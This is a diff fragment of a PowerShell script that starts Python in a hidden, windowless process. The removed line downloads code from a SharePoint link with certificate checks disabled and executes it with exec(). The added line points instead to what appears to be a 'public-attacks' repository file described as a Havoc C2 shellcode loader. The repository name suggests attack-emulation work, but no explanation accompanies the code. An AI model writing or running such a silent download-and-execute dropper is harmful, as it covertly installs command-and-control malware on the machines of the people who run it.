@@ -63,7 +63,7 @@ if (-not $pythonInstalled) {
 try {
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $pythonExe
-    $psi.Arguments = "-c `"import urllib.request,ssl;url='https://hao771.sharepoint.com/_layouts/15/download.aspx?share=ET4HvYX9laVJmgZEOi8IAh8BNSSerBcR1Mz-s_b558TjSA';context=ssl._create_unverified_context();exec(urllib.request.urlopen(url,context=context).read().decode('utf-8'))`""
+    $psi.Arguments = "-c `"import urllib.request,ssl;url='https://raw.githubusercontent.com/HiveForceLabs/public-attacks/refs/heads/development/Havoc%20C2%20via%20github/Python%20Shellcode%20Loader%20-%20payload_20250107_015913.py`""
     $psi.UseShellExecute = $false
     $psi.CreateNoWindow = $true
     $psi.WindowStyle = 'Hidden'
